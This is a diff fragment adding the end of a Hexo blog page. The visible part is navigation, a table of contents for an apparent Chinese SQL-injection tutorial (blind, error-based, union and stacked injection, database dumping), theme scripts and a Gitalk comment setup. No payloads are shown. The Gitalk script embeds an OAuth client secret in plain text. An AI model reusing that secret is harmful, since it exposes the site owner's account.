+    <a href="/2022/05/17/note_CTF/" rel="prev" title="Home">
+      <i class="fa fa-chevron-left"></i> Home
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/17/man_mysql/" rel="next" title="Home">
+      Home <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">注入模式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.1.</span> <span class="nav-text">基于布尔的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.1.2.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">2.1.3.</span> <span class="nav-text">适用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.2.</span> <span class="nav-text">基于时间的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">适用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">基于报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%96%B9%E6%B3%95"><span class="nav-number">2.3.2.</span> <span class="nav-text">报错方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FLOOR-RAND-GROUP-BY"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">FLOOR+RAND+GROUP BY</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Payload"><span class="nav-number">2.3.2.1.1.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UPDATEXML"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">UPDATEXML</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Payload-1"><span class="nav-number">2.3.2.2.1.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXTRACTVALUE"><span class="nav-number">2.3.2.3.</span> <span class="nav-text">EXTRACTVALUE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Payload-2"><span class="nav-number">2.3.2.3.1.</span> <span class="nav-text">Payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">适用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">适用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.</span> <span class="nav-text">堆查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-4"><span class="nav-number">2.5.1.</span> <span class="nav-text">适用场景</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD"><span class="nav-number">3.</span> <span class="nav-text">功能</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Options%E5%8F%82%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">Options参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Target%E5%8F%82%E6%95%B0"><span class="nav-number">3.2.</span> <span class="nav-text">Target参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Request%E5%8F%82%E6%95%B0"><span class="nav-number">3.3.</span> <span class="nav-text">Request参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Optimization%E5%8F%82%E6%95%B0"><span class="nav-number">3.4.</span> <span class="nav-text">Optimization参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Injection%E5%8F%82%E6%95%B0"><span class="nav-number">3.5.</span> <span class="nav-text">Injection参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Detection%E5%8F%82%E6%95%B0"><span class="nav-number">3.6.</span> <span class="nav-text">Detection参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Techniques%E5%8F%82%E6%95%B0"><span class="nav-number">3.7.</span> <span class="nav-text">Techniques参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fingerprint%E5%8F%82%E6%95%B0"><span class="nav-number">3.8.</span> <span class="nav-text">Fingerprint参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration%E5%8F%82%E6%95%B0"><span class="nav-number">3.9.</span> <span class="nav-text">Enumeration参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Brute-force%E5%8F%82%E6%95%B0"><span class="nav-number">3.10.</span> <span class="nav-text">Brute force参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Operating-System-Access%E5%8F%82%E6%95%B0"><span class="nav-number">3.11.</span> <span class="nav-text">Operating System Access参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#General%E5%8F%82%E6%95%B0"><span class="nav-number">3.12.</span> <span class="nav-text">General参数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">4.</span> <span class="nav-text">实例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E5%8F%82%E6%95%B0"><span class="nav-number">4.1.</span> <span class="nav-text">GET参数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%A7%8BPayload"><span class="nav-number">4.1.1.</span> <span class="nav-text">原始Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A%E5%8F%82%E6%95%B0"><span class="nav-number">4.1.2.</span> <span class="nav-text">指定参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E5%8F%82%E6%95%B0"><span class="nav-number">4.2.</span> <span class="nav-text">POST参数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%A7%8BPayload-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">原始Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%88%86%E5%89%B2"><span class="nav-number">4.2.2.</span> <span class="nav-text">参数分割</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%BD%BD%E5%85%A5"><span class="nav-number">4.3.</span> <span class="nav-text">文件载入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#request%E6%96%87%E4%BB%B6"><span class="nav-number">4.3.1.</span> <span class="nav-text">request文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#log%E6%96%87%E4%BB%B6"><span class="nav-number">4.3.2.</span> <span class="nav-text">log文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%96%E5%BA%93"><span class="nav-number">4.4.</span> <span class="nav-text">拖库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-2"><span class="nav-number">4.4.1.</span> <span class="nav-text">步骤</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="CheUhxg"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">CheUhxg</p>
+  <div class="site-description" itemprop="description">C0py for Coding</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CheUhxg</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'e2aed8eaf159652bc070',
+      clientSecret: '2482369803759b5bd152eee592d8b933706a1de2',
+      repo        : 'CheUhxg.github.io',
+      owner       : 'CheUhxg',
+      admin       : ['CheUhxg'],
+      id          : 'c0e59349e0a49413eab64a5ef0f02703',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
